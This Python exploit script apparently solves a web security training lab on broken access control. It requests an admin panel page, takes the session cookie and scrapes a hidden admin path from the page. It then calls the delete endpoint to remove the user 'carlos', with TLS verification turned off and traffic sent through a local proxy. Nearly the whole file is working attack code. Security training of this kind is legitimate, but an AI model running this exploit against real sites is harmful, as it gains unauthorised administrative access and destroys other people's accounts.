import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'https://127.0.0.1:8080'}

def delete_user(url):
    admin_panel_url = url + '/administrator-panel'
    r = requests.get(admin_panel_url,verify= False,proxies = proxies)
    #retrieve session cookie
    session_cookie = r.cookies.get_dict().get('session')
    #retrieve the admin path
    soup = BeautifulSoup(r.text,'lxml')
    admin_instances = soup.find(text=re.compile("/admin-"))
    # print(admin_instances)
    admin_path = re.search("href', '(.*)'",admin_instances).group(1)
    #print(admin_path)

    #delete carlos user
    cookie = {'session':session_cookie}
    delete_carlos_url = url + admin_path + 'delete?username=carlos'
    r = requests.get(delete_carlos_url,cookies=cookie,verify=False,proxies=proxies)
    if r.status_code == 200:
        print('(+) carlos deleted successfully')
    else:
        print('(+) deletion failed')
        print('(+) exiting script')


def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Usage: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("(+) Finding admin panel...")
    delete_user(url)
if __name__ == '__main__':
    main()
